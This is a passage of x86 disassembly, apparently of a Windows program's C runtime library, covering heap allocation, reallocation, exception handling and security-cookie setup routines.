  426f81:	mov    ecx,DWORD PTR [ebx+0x4]
  426f84:	cmp    ecx,DWORD PTR [ebx+0x8]
  426f87:	jne    0x426fe0
  426f89:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426f8d:	mov    BYTE PTR [ebp+0xf],cl
  426f90:	inc    cl
  426f92:	cmp    esi,0x20
  426f95:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426f99:	jae    0x426fb7
  426f9b:	cmp    BYTE PTR [ebp+0xf],0x0
  426f9f:	jne    0x426faf
  426fa1:	mov    ecx,esi
  426fa3:	mov    edi,0x80000000
  426fa8:	shr    edi,cl
  426faa:	mov    ecx,DWORD PTR [ebp+0x8]
  426fad:	or     DWORD PTR [ecx],edi
  426faf:	lea    eax,[eax+edx*4+0x44]
  426fb3:	mov    ecx,esi
  426fb5:	jmp    0x426fd7
  426fb7:	cmp    BYTE PTR [ebp+0xf],0x0
  426fbb:	jne    0x426fcd
  426fbd:	lea    ecx,[esi-0x20]
  426fc0:	mov    edi,0x80000000
  426fc5:	shr    edi,cl
  426fc7:	mov    ecx,DWORD PTR [ebp+0x8]
  426fca:	or     DWORD PTR [ecx+0x4],edi
  426fcd:	lea    eax,[eax+edx*4+0xc4]
  426fd4:	lea    ecx,[esi-0x20]
  426fd7:	mov    edx,0x80000000
  426fdc:	shr    edx,cl
  426fde:	or     DWORD PTR [eax],edx
  426fe0:	mov    eax,DWORD PTR [ebp+0x10]
  426fe3:	mov    DWORD PTR [ebx],eax
  426fe5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426fe9:	xor    eax,eax
  426feb:	inc    eax
  426fec:	pop    edi
  426fed:	pop    esi
  426fee:	pop    ebx
  426fef:	leave  
  426ff0:	ret    
  426ff1:	push   ebp
  426ff2:	mov    ebp,esp
  426ff4:	sub    esp,0x14
  426ff7:	mov    ecx,DWORD PTR [ebp+0x8]
  426ffa:	mov    eax,ds:0x4639fc
  426fff:	mov    edx,DWORD PTR ds:0x463a00
  427005:	add    ecx,0x17
  427008:	and    ecx,0xfffffff0
  42700b:	push   ebx
  42700c:	mov    DWORD PTR [ebp-0x10],ecx
  42700f:	sar    ecx,0x4
  427012:	push   esi
  427013:	lea    eax,[eax+eax*4]
  427016:	push   edi
  427017:	dec    ecx
  427018:	cmp    ecx,0x20
  42701b:	lea    edi,[edx+eax*4]
  42701e:	mov    DWORD PTR [ebp-0x4],edi
  427021:	jge    0x42702e
  427023:	or     esi,0xffffffff
  427026:	shr    esi,cl
  427028:	or     DWORD PTR [ebp-0x8],0xffffffff
  42702c:	jmp    0x42703b
  42702e:	add    ecx,0xffffffe0
  427031:	or     eax,0xffffffff
  427034:	xor    esi,esi
  427036:	shr    eax,cl
  427038:	mov    DWORD PTR [ebp-0x8],eax
  42703b:	mov    eax,ds:0x463a08
  427040:	mov    ebx,eax
  427042:	mov    DWORD PTR [ebp-0xc],esi
  427045:	cmp    ebx,edi
  427047:	jmp    0x42705d
  427049:	mov    ecx,DWORD PTR [ebx+0x4]
  42704c:	mov    edi,DWORD PTR [ebx]
  42704e:	and    ecx,DWORD PTR [ebp-0x8]
  427051:	and    edi,esi
  427053:	or     ecx,edi
  427055:	jne    0x427062
  427057:	add    ebx,0x14
  42705a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42705d:	mov    DWORD PTR [ebp+0x8],ebx
  427060:	jb     0x427049
  427062:	cmp    ebx,DWORD PTR [ebp-0x4]
  427065:	jne    0x42708b
  427067:	mov    ebx,edx
  427069:	jmp    0x42707c
  42706b:	mov    ecx,DWORD PTR [ebx+0x4]
  42706e:	mov    edi,DWORD PTR [ebx]
  427070:	and    ecx,DWORD PTR [ebp-0x8]
  427073:	and    edi,esi
  427075:	or     ecx,edi
  427077:	jne    0x427083
  427079:	add    ebx,0x14
  42707c:	cmp    ebx,eax
  42707e:	mov    DWORD PTR [ebp+0x8],ebx
  427081:	jb     0x42706b
  427083:	cmp    ebx,eax
  427085:	je     0x42711f
  42708b:	mov    DWORD PTR ds:0x463a08,ebx
  427091:	mov    eax,DWORD PTR [ebx+0x10]
  427094:	mov    edx,DWORD PTR [eax]
  427096:	cmp    edx,0xffffffff
  427099:	mov    DWORD PTR [ebp-0x4],edx
  42709c:	je     0x4270b2
  42709e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4270a5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4270a9:	and    ecx,DWORD PTR [ebp-0x8]
  4270ac:	and    edi,esi
  4270ae:	or     ecx,edi
  4270b0:	jne    0x4270e8
  4270b2:	mov    edx,DWORD PTR [eax+0xc4]
  4270b8:	and    edx,DWORD PTR [ebp-0x8]
  4270bb:	and    DWORD PTR [ebp-0x4],0x0
  4270bf:	lea    ecx,[eax+0x44]
  4270c2:	mov    esi,DWORD PTR [ecx]
  4270c4:	and    esi,DWORD PTR [ebp-0xc]
  4270c7:	or     edx,esi
  4270c9:	mov    esi,DWORD PTR [ebp-0xc]
  4270cc:	jne    0x4270e5
  4270ce:	mov    edx,DWORD PTR [ecx+0x84]
  4270d4:	and    edx,DWORD PTR [ebp-0x8]
  4270d7:	inc    DWORD PTR [ebp-0x4]
  4270da:	add    ecx,0x4
  4270dd:	mov    edi,DWORD PTR [ecx]
  4270df:	and    edi,esi
  4270e1:	or     edx,edi
  4270e3:	je     0x4270ce
  4270e5:	mov    edx,DWORD PTR [ebp-0x4]
  4270e8:	mov    ecx,edx
  4270ea:	imul   ecx,ecx,0x204
  4270f0:	lea    ecx,[ecx+eax*1+0x144]
  4270f7:	mov    DWORD PTR [ebp-0xc],ecx
  4270fa:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  4270fe:	xor    edi,edi
  427100:	and    ecx,esi
  427102:	jne    0x427171
  427104:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42710b:	and    ecx,DWORD PTR [ebp-0x8]
  42710e:	push   0x20
  427110:	pop    edi
  427111:	jmp    0x427171
  427113:	cmp    DWORD PTR [ebx+0x8],0x0
  427117:	jne    0x427124
  427119:	add    ebx,0x14
  42711c:	mov    DWORD PTR [ebp+0x8],ebx
  42711f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427122:	jb     0x427113
  427124:	cmp    ebx,DWORD PTR [ebp-0x4]
  427127:	jne    0x42714f
  427129:	mov    ebx,edx
  42712b:	jmp    0x427136
  42712d:	cmp    DWORD PTR [ebx+0x8],0x0
  427131:	jne    0x42713d
  427133:	add    ebx,0x14
  427136:	cmp    ebx,eax
  427138:	mov    DWORD PTR [ebp+0x8],ebx
  42713b:	jb     0x42712d
  42713d:	cmp    ebx,eax
  42713f:	jne    0x42714f
  427141:	call   0x426b55
  427146:	mov    ebx,eax
  427148:	test   ebx,ebx
  42714a:	mov    DWORD PTR [ebp+0x8],ebx
  42714d:	je     0x427167
  42714f:	push   ebx
  427150:	call   0x426c0c
  427155:	pop    ecx
  427156:	mov    ecx,DWORD PTR [ebx+0x10]
  427159:	mov    DWORD PTR [ecx],eax
  42715b:	mov    eax,DWORD PTR [ebx+0x10]
  42715e:	cmp    DWORD PTR [eax],0xffffffff
  427161:	jne    0x42708b
  427167:	xor    eax,eax
  427169:	jmp    0x4272e8
  42716e:	shl    ecx,1
  427170:	inc    edi
  427171:	test   ecx,ecx
  427173:	jge    0x42716e
  427175:	mov    ecx,DWORD PTR [ebp-0xc]
  427178:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42717c:	mov    ecx,DWORD PTR [edx]
  42717e:	sub    ecx,DWORD PTR [ebp-0x10]
  427181:	mov    esi,ecx
  427183:	sar    esi,0x4
  427186:	dec    esi
  427187:	cmp    esi,0x3f
  42718a:	mov    DWORD PTR [ebp-0x8],ecx
  42718d:	jle    0x427192
  42718f:	push   0x3f
  427191:	pop    esi
  427192:	cmp    esi,edi
  427194:	je     0x42729b
  42719a:	mov    ecx,DWORD PTR [edx+0x4]
  42719d:	cmp    ecx,DWORD PTR [edx+0x8]
  4271a0:	jne    0x4271fe
  4271a2:	cmp    edi,0x20
  4271a5:	mov    ebx,0x80000000
  4271aa:	jge    0x4271d2
  4271ac:	mov    ecx,edi
  4271ae:	shr    ebx,cl
  4271b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271b3:	lea    edi,[eax+edi*1+0x4]
  4271b7:	not    ebx
  4271b9:	mov    DWORD PTR [ebp-0x14],ebx
  4271bc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4271c0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4271c4:	dec    BYTE PTR [edi]
  4271c6:	jne    0x4271fb
  4271c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4271cb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271ce:	and    DWORD PTR [ebx],ecx
  4271d0:	jmp    0x4271fe
  4271d2:	lea    ecx,[edi-0x20]
  4271d5:	shr    ebx,cl
  4271d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4271da:	lea    ecx,[eax+ecx*4+0xc4]
  4271e1:	lea    edi,[eax+edi*1+0x4]
  4271e5:	not    ebx
  4271e7:	and    DWORD PTR [ecx],ebx
  4271e9:	dec    BYTE PTR [edi]
  4271eb:	mov    DWORD PTR [ebp-0x14],ebx
  4271ee:	jne    0x4271fb
  4271f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4271f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271f6:	and    DWORD PTR [ebx+0x4],ecx
  4271f9:	jmp    0x4271fe
  4271fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271fe:	cmp    DWORD PTR [ebp-0x8],0x0
  427202:	mov    ecx,DWORD PTR [edx+0x8]
  427205:	mov    edi,DWORD PTR [edx+0x4]
  427208:	mov    DWORD PTR [ecx+0x4],edi
  42720b:	mov    ecx,DWORD PTR [edx+0x4]
  42720e:	mov    edi,DWORD PTR [edx+0x8]
  427211:	mov    DWORD PTR [ecx+0x8],edi
  427214:	je     0x4272a7
  42721a:	mov    ecx,DWORD PTR [ebp-0xc]
  42721d:	lea    ecx,[ecx+esi*8]
  427220:	mov    edi,DWORD PTR [ecx+0x4]
  427223:	mov    DWORD PTR [edx+0x8],ecx
  427226:	mov    DWORD PTR [edx+0x4],edi
  427229:	mov    DWORD PTR [ecx+0x4],edx
  42722c:	mov    ecx,DWORD PTR [edx+0x4]
  42722f:	mov    DWORD PTR [ecx+0x8],edx
  427232:	mov    ecx,DWORD PTR [edx+0x4]
  427235:	cmp    ecx,DWORD PTR [edx+0x8]
  427238:	jne    0x427298
  42723a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42723e:	mov    BYTE PTR [ebp+0xb],cl
  427241:	inc    cl
  427243:	cmp    esi,0x20
  427246:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42724a:	jge    0x42726f
  42724c:	cmp    BYTE PTR [ebp+0xb],0x0
  427250:	jne    0x42725d
  427252:	mov    edi,0x80000000
  427257:	mov    ecx,esi
  427259:	shr    edi,cl
  42725b:	or     DWORD PTR [ebx],edi
  42725d:	mov    ecx,esi
  42725f:	mov    edi,0x80000000
  427264:	shr    edi,cl
  427266:	mov    ecx,DWORD PTR [ebp-0x4]
  427269:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42726d:	jmp    0x427298
  42726f:	cmp    BYTE PTR [ebp+0xb],0x0
  427273:	jne    0x427282
  427275:	lea    ecx,[esi-0x20]
  427278:	mov    edi,0x80000000
  42727d:	shr    edi,cl
  42727f:	or     DWORD PTR [ebx+0x4],edi
  427282:	mov    ecx,DWORD PTR [ebp-0x4]
  427285:	lea    edi,[eax+ecx*4+0xc4]
  42728c:	lea    ecx,[esi-0x20]
  42728f:	mov    esi,0x80000000
  427294:	shr    esi,cl
  427296:	or     DWORD PTR [edi],esi
  427298:	mov    ecx,DWORD PTR [ebp-0x8]
  42729b:	test   ecx,ecx
  42729d:	je     0x4272aa
  42729f:	mov    DWORD PTR [edx],ecx
  4272a1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4272a5:	jmp    0x4272aa
  4272a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4272aa:	mov    esi,DWORD PTR [ebp-0x10]
  4272ad:	add    edx,ecx
  4272af:	lea    ecx,[esi+0x1]
  4272b2:	mov    DWORD PTR [edx],ecx
  4272b4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4272b8:	mov    esi,DWORD PTR [ebp-0xc]
  4272bb:	mov    ecx,DWORD PTR [esi]
  4272bd:	test   ecx,ecx
  4272bf:	lea    edi,[ecx+0x1]
  4272c2:	mov    DWORD PTR [esi],edi
  4272c4:	jne    0x4272e0
  4272c6:	cmp    ebx,DWORD PTR ds:0x4639f8
  4272cc:	jne    0x4272e0
  4272ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4272d1:	cmp    ecx,DWORD PTR ds:0x463a10
  4272d7:	jne    0x4272e0
  4272d9:	and    DWORD PTR ds:0x4639f8,0x0
  4272e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4272e3:	mov    DWORD PTR [eax],ecx
  4272e5:	lea    eax,[edx+0x4]
  4272e8:	pop    edi
  4272e9:	pop    esi
  4272ea:	pop    ebx
  4272eb:	leave  
  4272ec:	ret    
  4272ed:	int3   
  4272ee:	int3   
  4272ef:	int3   
  4272f0:	push   esi
  4272f1:	inc    ebx
  4272f2:	xor    dh,BYTE PTR [eax]
  4272f4:	pop    eax
  4272f5:	inc    ebx
  4272f6:	xor    BYTE PTR [eax],dh
  4272f8:	push   ebp
  4272f9:	mov    ebp,esp
  4272fb:	sub    esp,0x8
  4272fe:	push   ebx
  4272ff:	push   esi
  427300:	push   edi
  427301:	push   ebp
  427302:	cld    
  427303:	mov    ebx,DWORD PTR [ebp+0xc]
  427306:	mov    eax,DWORD PTR [ebp+0x8]
  427309:	test   DWORD PTR [eax+0x4],0x6
  427310:	jne    0x427398
  427316:	mov    DWORD PTR [ebp-0x8],eax
  427319:	mov    eax,DWORD PTR [ebp+0x10]
  42731c:	mov    DWORD PTR [ebp-0x4],eax
  42731f:	lea    eax,[ebp-0x8]
  427322:	mov    DWORD PTR [ebx-0x4],eax
  427325:	mov    esi,DWORD PTR [ebx+0xc]
  427328:	mov    edi,DWORD PTR [ebx+0x8]
  42732b:	cmp    esi,0xffffffff
  42732e:	je     0x427391
  427330:	lea    ecx,[esi+esi*2]
  427333:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427338:	je     0x42737f
  42733a:	push   esi
  42733b:	push   ebp
  42733c:	lea    ebp,[ebx+0x10]
  42733f:	call   DWORD PTR [edi+ecx*4+0x4]
  427343:	pop    ebp
  427344:	pop    esi
  427345:	mov    ebx,DWORD PTR [ebp+0xc]
  427348:	or     eax,eax
  42734a:	je     0x42737f
  42734c:	js     0x42738a
  42734e:	mov    edi,DWORD PTR [ebx+0x8]
  427351:	push   ebx
  427352:	call   0x428280
  427357:	add    esp,0x4
  42735a:	lea    ebp,[ebx+0x10]
  42735d:	push   esi
  42735e:	push   ebx
  42735f:	call   0x4282c2
  427364:	add    esp,0x8
  427367:	lea    ecx,[esi+esi*2]
  42736a:	push   0x1
  42736c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427370:	call   0x428356
  427375:	mov    eax,DWORD PTR [edi+ecx*4]
  427378:	mov    DWORD PTR [ebx+0xc],eax
  42737b:	call   DWORD PTR [edi+ecx*4+0x8]
  42737f:	mov    edi,DWORD PTR [ebx+0x8]
  427382:	lea    ecx,[esi+esi*2]
  427385:	mov    esi,DWORD PTR [edi+ecx*4]
  427388:	jmp    0x42732b
  42738a:	mov    eax,0x0
  42738f:	jmp    0x4273ad
  427391:	mov    eax,0x1
  427396:	jmp    0x4273ad
  427398:	push   ebp
  427399:	lea    ebp,[ebx+0x10]
  42739c:	push   0xffffffff
  42739e:	push   ebx
  42739f:	call   0x4282c2
  4273a4:	add    esp,0x8
  4273a7:	pop    ebp
  4273a8:	mov    eax,0x1
  4273ad:	pop    ebp
  4273ae:	pop    edi
  4273af:	pop    esi
  4273b0:	pop    ebx
  4273b1:	mov    esp,ebp
  4273b3:	pop    ebp
  4273b4:	ret    
  4273b5:	push   ebp
  4273b6:	mov    ecx,DWORD PTR [esp+0x8]
  4273ba:	mov    ebp,DWORD PTR [ecx]
  4273bc:	mov    eax,DWORD PTR [ecx+0x1c]
  4273bf:	push   eax
  4273c0:	mov    eax,DWORD PTR [ecx+0x18]
  4273c3:	push   eax
  4273c4:	call   0x4282c2
  4273c9:	add    esp,0x8
  4273cc:	pop    ebp
  4273cd:	ret    0x4
  4273d0:	call   0x4252e9
  4273d5:	add    eax,0x8
  4273d8:	ret    
  4273d9:	push   0x14
  4273db:	push   0x4298c0
  4273e0:	call   0x425434
  4273e5:	mov    edi,DWORD PTR [ebp+0x8]
  4273e8:	xor    ebx,ebx
  4273ea:	cmp    edi,ebx
  4273ec:	jne    0x4273fc
  4273ee:	push   DWORD PTR [ebp+0xc]
  4273f1:	call   0x426152
  4273f6:	pop    ecx
  4273f7:	jmp    0x427580
  4273fc:	mov    esi,DWORD PTR [ebp+0xc]
  4273ff:	cmp    esi,ebx
  427401:	jne    0x42740f
  427403:	push   edi
  427404:	call   0x42603a
  427409:	pop    ecx
  42740a:	jmp    0x42757e
  42740f:	cmp    DWORD PTR ds:0x463c44,0x3
  427416:	jne    0x42754a
  42741c:	mov    DWORD PTR [ebp-0x1c],ebx
  42741f:	cmp    esi,0xffffffe0
  427422:	ja     0x427519
  427428:	push   0x4
  42742a:	call   0x4255ef
  42742f:	pop    ecx
  427430:	mov    DWORD PTR [ebp-0x4],ebx
  427433:	push   edi
  427434:	call   0x426812
  427439:	pop    ecx
  42743a:	mov    DWORD PTR [ebp-0x20],eax
  42743d:	cmp    eax,ebx
  42743f:	je     0x4274e9
  427445:	cmp    esi,DWORD PTR ds:0x463a04
  42744b:	ja     0x427499
  42744d:	push   esi
  42744e:	push   edi
  42744f:	push   eax
  427450:	call   0x426d12
  427455:	add    esp,0xc
  427458:	test   eax,eax
  42745a:	je     0x427461
  42745c:	mov    DWORD PTR [ebp-0x1c],edi
  42745f:	jmp    0x427499
  427461:	push   esi
  427462:	call   0x426ff1
  427467:	pop    ecx
  427468:	mov    DWORD PTR [ebp-0x1c],eax
  42746b:	cmp    eax,ebx
  42746d:	je     0x427499
  42746f:	mov    eax,DWORD PTR [edi-0x4]
  427472:	dec    eax
  427473:	mov    DWORD PTR [ebp-0x24],eax
  427476:	cmp    eax,esi
  427478:	jb     0x42747c
  42747a:	mov    eax,esi
  42747c:	push   eax
  42747d:	push   edi
  42747e:	push   DWORD PTR [ebp-0x1c]
  427481:	call   0x426170
  427486:	push   edi
  427487:	call   0x426812
  42748c:	mov    DWORD PTR [ebp-0x20],eax
  42748f:	push   edi
  427490:	push   eax
  427491:	call   0x42683d
  427496:	add    esp,0x18
  427499:	cmp    DWORD PTR [ebp-0x1c],ebx
  42749c:	jne    0x4274e9
  42749e:	cmp    esi,ebx
  4274a0:	jne    0x4274a8
  4274a2:	xor    esi,esi
  4274a4:	inc    esi
  4274a5:	mov    DWORD PTR [ebp+0xc],esi
  4274a8:	add    esi,0xf
  4274ab:	and    esi,0xfffffff0
  4274ae:	mov    DWORD PTR [ebp+0xc],esi
  4274b1:	push   esi
  4274b2:	push   ebx
  4274b3:	push   DWORD PTR ds:0x463c40
  4274b9:	call   DWORD PTR ds:0x429038
  4274bf:	mov    DWORD PTR [ebp-0x1c],eax
  4274c2:	cmp    eax,ebx
  4274c4:	je     0x4274e9
  4274c6:	mov    eax,DWORD PTR [edi-0x4]
  4274c9:	dec    eax
  4274ca:	mov    DWORD PTR [ebp-0x24],eax
  4274cd:	cmp    eax,esi
  4274cf:	jb     0x4274d3
  4274d1:	mov    eax,esi
  4274d3:	push   eax
  4274d4:	push   edi
  4274d5:	push   DWORD PTR [ebp-0x1c]
  4274d8:	call   0x426170
  4274dd:	push   edi
  4274de:	push   DWORD PTR [ebp-0x20]
  4274e1:	call   0x42683d
  4274e6:	add    esp,0x14
  4274e9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ed:	call   0x427541
  4274f2:	cmp    DWORD PTR [ebp-0x20],ebx
  4274f5:	jne    0x427519
  4274f7:	cmp    esi,ebx
  4274f9:	jne    0x4274fe
  4274fb:	xor    esi,esi
  4274fd:	inc    esi
  4274fe:	add    esi,0xf
  427501:	and    esi,0xfffffff0
  427504:	mov    DWORD PTR [ebp+0xc],esi
  427507:	push   esi
  427508:	push   edi
  427509:	push   ebx
  42750a:	push   DWORD PTR ds:0x463c40
  427510:	call   DWORD PTR ds:0x42910c
  427516:	mov    DWORD PTR [ebp-0x1c],eax
  427519:	mov    eax,DWORD PTR [ebp-0x1c]
  42751c:	cmp    eax,ebx
  42751e:	jne    0x427580
  427520:	cmp    DWORD PTR ds:0x4638c8,ebx
  427526:	je     0x427580
  427528:	push   esi
  427529:	call   0x427d12
  42752e:	pop    ecx
  42752f:	test   eax,eax
  427531:	jne    0x42741c
  427537:	jmp    0x42757e
  427539:	xor    ebx,ebx
  42753b:	mov    esi,DWORD PTR [ebp+0xc]
  42753e:	mov    edi,DWORD PTR [ebp+0x8]
  427541:	push   0x4
  427543:	call   0x42555b
  427548:	pop    ecx
  427549:	ret    
  42754a:	xor    eax,eax
  42754c:	cmp    esi,0xffffffe0
  42754f:	ja     0x427567
  427551:	cmp    esi,ebx
  427553:	jne    0x427558
  427555:	xor    esi,esi
  427557:	inc    esi
  427558:	push   esi
  427559:	push   edi
  42755a:	push   ebx
  42755b:	push   DWORD PTR ds:0x463c40
  427561:	call   DWORD PTR ds:0x42910c
  427567:	cmp    eax,ebx
  427569:	jne    0x427580
  42756b:	cmp    DWORD PTR ds:0x4638c8,ebx
  427571:	je     0x427580
  427573:	push   esi
  427574:	call   0x427d12
  427579:	pop    ecx
  42757a:	test   eax,eax
  42757c:	jne    0x42754a
  42757e:	xor    eax,eax
  427580:	call   0x42546f
  427585:	ret    
  427586:	push   0x10
  427588:	push   0x4298d0
  42758d:	call   0x425434
  427592:	cmp    DWORD PTR ds:0x463c44,0x3
  427599:	jne    0x4275d5
  42759b:	push   0x4
  42759d:	call   0x4255ef
  4275a2:	pop    ecx
  4275a3:	and    DWORD PTR [ebp-0x4],0x0
  4275a7:	mov    esi,DWORD PTR [ebp+0x8]
  4275aa:	push   esi
  4275ab:	call   0x426812
  4275b0:	pop    ecx
  4275b1:	mov    DWORD PTR [ebp-0x1c],eax
  4275b4:	test   eax,eax
  4275b6:	je     0x4275c3
  4275b8:	mov    esi,DWORD PTR [esi-0x4]
  4275bb:	sub    esi,0x9
  4275be:	mov    DWORD PTR [ebp-0x20],esi
  4275c1:	jmp    0x4275c6
  4275c3:	mov    esi,DWORD PTR [ebp-0x20]
  4275c6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275ca:	call   0x4275f3
  4275cf:	cmp    DWORD PTR [ebp-0x1c],0x0
  4275d3:	jne    0x4275e8
  4275d5:	push   DWORD PTR [ebp+0x8]
  4275d8:	push   0x0
  4275da:	push   DWORD PTR ds:0x463c40
  4275e0:	call   DWORD PTR ds:0x429110
  4275e6:	mov    esi,eax
  4275e8:	mov    eax,esi
  4275ea:	call   0x42546f
  4275ef:	ret    
  4275f0:	mov    esi,DWORD PTR [ebp-0x20]
  4275f3:	push   0x4
  4275f5:	call   0x42555b
  4275fa:	pop    ecx
  4275fb:	ret    
  4275fc:	push   ebp
  4275fd:	mov    ebp,esp
  4275ff:	sub    esp,0x10
  427602:	push   esi
  427603:	lea    eax,[ebp-0x8]
  427606:	push   eax
  427607:	call   DWORD PTR ds:0x429120
  42760d:	mov    esi,DWORD PTR [ebp-0x4]
  427610:	xor    esi,DWORD PTR [ebp-0x8]
  427613:	call   DWORD PTR ds:0x42911c
  427619:	xor    esi,eax
  42761b:	call   DWORD PTR ds:0x4290d8
  427621:	xor    esi,eax
  427623:	call   DWORD PTR ds:0x429118
  427629:	xor    esi,eax
  42762b:	lea    eax,[ebp-0x10]
  42762e:	push   eax
  42762f:	call   DWORD PTR ds:0x429114
  427635:	mov    eax,DWORD PTR [ebp-0xc]
  427638:	xor    eax,DWORD PTR [ebp-0x10]
  42763b:	xor    esi,eax
  42763d:	mov    DWORD PTR ds:0x462f30,esi
  427643:	jne    0x42764f
  427645:	mov    DWORD PTR ds:0x462f30,0xbb40e64e
  42764f:	pop    esi
  427650:	leave  
  427651:	ret    
  427652:	push   0x118
  427657:	push   0x429a80
  42765c:	call   0x425434
  427661:	mov    eax,ds:0x462f30
  427666:	xor    eax,DWORD PTR [ebp+0x4]
  427669:	mov    DWORD PTR [ebp-0x1c],eax
  42766c:	mov    eax,ds:0x463898
  427671:	xor    ecx,ecx
  427673:	cmp    eax,ecx
  427675:	je     0x427696
  427677:	mov    DWORD PTR [ebp-0x4],ecx
  42767a:	push   DWORD PTR [ebp+0xc]
  42767d:	push   DWORD PTR [ebp+0x8]
  427680:	call   eax
  427682:	pop    ecx
  427683:	pop    ecx
  427684:	or     DWORD PTR [ebp-0x4],0xffffffff
  427688:	jmp    0x427794
  42768d:	xor    eax,eax
  42768f:	inc    eax
  427690:	ret    
  427691:	mov    esp,DWORD PTR [ebp-0x18]
  427694:	jmp    0x427684
  427696:	mov    eax,DWORD PTR [ebp+0x8]
  427699:	dec    eax
  42769a:	je     0x4276af
  42769c:	mov    edi,0x429a5c
  4276a1:	mov    DWORD PTR [ebp-0x20],0x4299a8
  4276a8:	mov    esi,0xd4
  4276ad:	jmp    0x4276c0
  4276af:	mov    edi,0x429988
  4276b4:	mov    DWORD PTR [ebp-0x20],0x4298e8
  4276bb:	mov    esi,0xb9
  4276c0:	mov    BYTE PTR [ebp-0x24],cl
  4276c3:	push   0x104
  4276c8:	lea    eax,[ebp-0x128]
  4276ce:	push   eax
  4276cf:	push   ecx
  4276d0:	call   DWORD PTR ds:0x4290a8
  4276d6:	test   eax,eax
  4276d8:	jne    0x4276ed
  4276da:	push   0x4295dc
  4276df:	lea    eax,[ebp-0x128]
  4276e5:	push   eax
  4276e6:	call   0x425810
  4276eb:	pop    ecx
  4276ec:	pop    ecx
  4276ed:	lea    ebx,[ebp-0x128]
  4276f3:	lea    eax,[ebp-0x128]
  4276f9:	push   eax
  4276fa:	call   0x425a40
  4276ff:	pop    ecx
  427700:	add    eax,0xb
  427703:	cmp    eax,0x3c
  427706:	jbe    0x427731
  427708:	lea    eax,[ebp-0x128]
  42770e:	push   eax
  42770f:	call   0x425a40
  427714:	mov    ebx,eax
  427716:	lea    eax,[ebp-0x128]
  42771c:	sub    eax,0x31
  42771f:	add    ebx,eax
  427721:	push   0x3
  427723:	push   0x4295d8
  427728:	push   ebx
  427729:	call   0x425910
  42772e:	add    esp,0x10
  427731:	push   ebx
  427732:	call   0x425a40
  427737:	pop    ecx
  427738:	lea    eax,[eax+esi*1+0xc]
  42773c:	add    eax,0x3
  42773f:	and    eax,0xfffffffc
  427742:	call   0x425480
  427747:	mov    DWORD PTR [ebp-0x18],esp
  42774a:	mov    esi,esp
  42774c:	push   edi
  42774d:	push   esi
  42774e:	call   0x425810
  427753:	mov    edi,0x4295b8
  427758:	push   edi
  427759:	push   esi
  42775a:	call   0x425820
  42775f:	push   0x4298dc
  427764:	push   esi
  427765:	call   0x425820
  42776a:	push   ebx
  42776b:	push   esi
  42776c:	call   0x425820
  427771:	push   edi
  427772:	push   esi
  427773:	call   0x425820
  427778:	push   DWORD PTR [ebp-0x20]
  42777b:	push   esi
  42777c:	call   0x425820
  427781:	push   0x12010
  427786:	push   0x429590
  42778b:	push   esi
  42778c:	call   0x425712
  427791:	add    esp,0x3c
  427794:	push   0x3
  427796:	call   0x4248a2
  42779b:	int3   
  42779c:	push   0x38
  42779e:	push   0x429ea0
  4277a3:	call   0x425434
  4277a8:	xor    ebx,ebx
  4277aa:	cmp    DWORD PTR ds:0x4638bc,ebx
  4277b0:	jne    0x4277ea
  4277b2:	push   ebx
  4277b3:	push   ebx
  4277b4:	xor    esi,esi
  4277b6:	inc    esi
  4277b7:	push   esi
  4277b8:	push   0x429e9c
  4277bd:	push   0x100
  4277c2:	push   ebx
  4277c3:	call   DWORD PTR ds:0x42912c
  4277c9:	test   eax,eax
  4277cb:	je     0x4277d5
  4277cd:	mov    DWORD PTR ds:0x4638bc,esi
  4277d3:	jmp    0x4277ea
  4277d5:	call   DWORD PTR ds:0x429030
  4277db:	cmp    eax,0x78
  4277de:	jne    0x4277ea
  4277e0:	mov    DWORD PTR ds:0x4638bc,0x2
  4277ea:	cmp    DWORD PTR [ebp+0x14],ebx
  4277ed:	jle    0x42780a
  4277ef:	mov    ecx,DWORD PTR [ebp+0x14]
  4277f2:	mov    eax,DWORD PTR [ebp+0x10]
  4277f5:	dec    ecx
  4277f6:	cmp    BYTE PTR [eax],bl
  4277f8:	je     0x427802
  4277fa:	inc    eax
  4277fb:	cmp    ecx,ebx
  4277fd:	jne    0x4277f5
  4277ff:	or     ecx,0xffffffff
  427802:	or     eax,0xffffffff
  427805:	sub    eax,ecx
  427807:	add    DWORD PTR [ebp+0x14],eax
  42780a:	mov    eax,ds:0x4638bc
  42780f:	cmp    eax,0x2
  427812:	je     0x4279f4
  427818:	cmp    eax,ebx
  42781a:	je     0x4279f4
  427820:	cmp    eax,0x1
  427823:	jne    0x427a27
  427829:	xor    edi,edi
  42782b:	mov    DWORD PTR [ebp-0x1c],edi
  42782e:	mov    DWORD PTR [ebp-0x20],ebx
  427831:	mov    DWORD PTR [ebp-0x24],ebx
  427834:	cmp    DWORD PTR [ebp+0x20],ebx
  427837:	jne    0x427841
  427839:	mov    eax,ds:0x4638b4
  42783e:	mov    DWORD PTR [ebp+0x20],eax
  427841:	push   ebx
